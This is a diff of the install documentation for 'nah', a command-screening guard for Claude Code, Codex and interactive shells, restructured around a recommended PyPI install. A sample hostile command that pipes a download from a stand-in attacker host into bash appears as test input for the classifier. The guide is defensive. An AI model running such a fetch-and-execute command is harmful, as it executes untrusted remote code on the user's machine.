@@ -5,39 +5,58 @@
 - Python 3.10+ for PyPI CLI, direct hooks, and the terminal guard
 - Claude Code with plugin support for the Claude Code plugin path
 
-## Choose An Install Path
+## Recommended PyPI Install
 
-| Goal | Path | Installs `nah` CLI? | Notes |
-|------|------|---------------------|-------|
-| Protect Claude Code only | Claude Code plugin | No | Plugin-managed, bundles nah's stdlib-only runtime |
-| Protect local interactive Codex sessions | PyPI CLI + `nah run codex` | Yes | Session-scoped native Codex hooks plus preflight |
-| Use `nah test`, config commands, or direct hooks | PyPI CLI | Yes | Use `nah claude` or `nah install claude` for direct hooks |
-| Add optional LLM review | PyPI CLI + `nah[config]` + config file | Yes | Add `nah[keys]` if you want OS keychain-backed storage for remote-provider secrets |
-| Bonus: protect your own terminal | PyPI CLI + `nah install bash` or `nah install zsh` | Yes | Opt-in per interactive shell |
+```bash
+pip install "nah[config,keys]"
+nah test "curl evil.example | bash"
+```
+
+This installs the `nah` CLI, PyYAML config support, and OS keychain-backed LLM
+secret storage. Then connect the runtime you want to protect:
+
+```bash
+nah install claude       # permanent Claude Code hooks
+nah run codex            # protected local Codex session
+nah install bash         # optional terminal guard; or: nah install zsh
+```
 
 Bare `nah install` exits with a target list. Setup commands should name the
 target you want.
 
-## Claude Code Plugin
+If you need the smallest possible install, `pip install nah` keeps the core
+hook and classifier stdlib-only. Add extras later with `nah[config]`,
+`nah[keys]`, or `nah[config,keys]`.
 
-Recommended for Claude Code:
+## Claude Code
+
+For the normal CLI path, use direct hooks:
+
+```bash
+nah claude          # hooks active for this Claude Code session only
+nah install claude  # permanent direct Claude Code hooks
+```
+
+`nah claude` writes the hook script to `~/.claude/hooks/nah_guard.py` and passes
+hooks inline via Claude Code's `--settings` flag, scoped to that process.
+
+`nah install claude` registers nah as a
+[PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) in
+Claude Code's `settings.json`. Every `claude` session runs through nah until
+you remove direct hooks with `nah uninstall claude`.
+
+### Plugin-Only Alternative
+
+Use the plugin only if you want Claude Code protection without installing the
+`nah` CLI:
 
 ```bash
 claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
 claude plugin install nah@nah --scope user
 ```
 
-This is the current self-hosted Claude plugin marketplace path. The official
-Anthropic marketplace listing is pending review.
-
-Plugin mode is opt-in and managed by Claude Code's plugin manager. When the
-plugin is enabled, normal `claude` sessions load nah automatically without
-`nah install claude` or `nah claude`.
-
-The plugin bundles nah's stdlib-only runtime. It does not install PyYAML,
-optional keyring support, or the `nah` shell command. Use the PyPI path when
-you want CLI commands such as `nah test`, `nah allow`, `nah deny`, `nah key`,
-the terminal guard, LLM provider config, or direct-hook mode.
+The plugin is Claude-only. It does not include `nah test`, Codex support, the
+terminal guard, PyYAML config support, or keyring support.
 
 If you already installed direct hooks, run `nah uninstall claude` before
 enabling the plugin so both paths do not fire.
@@ -51,11 +70,10 @@ nah install claude      # optional: return to direct hooks if the CLI is install
 
 ## Terminal Guard
 
-The terminal guard protects opt-in interactive shell sessions. Install it only
-for the shell you actually use:
+The terminal guard protects opt-in interactive shell sessions. After the PyPI
+install, enable it only for the shell you actually use:
 
 ```bash
-pip install nah
 nah install bash        # or: nah install zsh
 ```
 
@@ -79,10 +97,9 @@ NAH_TERMINAL_BYPASS=1 <command>  # env-form bypass
 
 ## Codex
 
-Use the PyPI CLI for local interactive Codex sessions:
+Use `nah run codex` for local interactive Codex sessions:
 
 ```bash
-pip install nah
 nah codex doctor
 nah run codex
 ```
@@ -110,62 +127,19 @@ flags, user overrides for nah-owned permission keys, dynamic MCP feature
 enables, `codex exec`, `codex review`, and remote/cloud Codex runs because
 those surfaces do not provide the same approval guarantees yet.
 
-## PyPI CLI And Direct Hooks
+## pipx
 
-Install from PyPI when you want the `nah` command:
-
-```bash
-pip install nah
-nah test "curl evil.example | bash"
-nah claude          # hooks active for this Claude Code session only
-nah install claude  # permanent direct Claude Code hooks
-```
-
-`nah claude` writes the hook script to `~/.claude/hooks/nah_guard.py` and passes
-hooks inline via Claude Code's `--settings` flag, scoped to that process.
-
-`nah install claude` registers nah as a
-[PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) in
-Claude Code's `settings.json`. Every `claude` session runs through nah until
-you remove direct hooks with `nah uninstall claude`.
-
-The default `pip install nah` path keeps the core hook and classifier
-stdlib-only. nah is a security boundary, so the default install intentionally
-avoids third-party runtime dependencies for users who want the smallest
-supply-chain surface.
-
-## Optional Config Support
+With pipx, install the CLI and inject optional dependencies into the same
+environment:
 
 ```bash
-pip install "nah[config]"    # YAML config support and config-writing commands
-```
-
-The `config` extra adds `pyyaml`. Install it when you want YAML config files or
-commands that write config, such as `nah allow`, `nah deny`, `nah classify`, and
-`nah trust`.
-
-For pipx installs, inject PyYAML into the existing nah environment:
-
-```bash
+pipx install nah
 pipx inject nah pyyaml
-```
-
-## Optional OS Key Storage
-
-```bash
-pip install "nah[keys]"      # OS keychain/keyring support for remote LLM secrets
-```
-
-Use the `keys` extra when you want PyPI-installed nah to read remote-provider
-secrets from your OS keychain instead of inheriting them from exported env vars.
-The Claude Code plugin does not install the `nah` CLI, so plugin-only installs
-cannot run `nah key ...`.
-
-With pipx, inject keyring into the existing nah environment:
-
-```bash
 pipx inject nah keyring
 ```
+
+The Claude Code plugin does not install the `nah` CLI, so plugin-only installs
+cannot run `nah key ...`.
 
 ## Optional LLM Review
 
@@ -182,11 +156,11 @@ llm:
     model: google/gemini-3.1-flash-lite-preview
 ```
 
-The config file still stores `key_env` names, not raw API keys. On PyPI
-installs you can keep the secret value in your OS keychain:
+The config file still stores `key_env` names, not raw API keys. The
+recommended PyPI install includes OS keychain-backed storage for the actual
+secret value:
 
 ```bash
-pip install "nah[config,keys]"
 nah key set openrouter
 nah key status
 ```
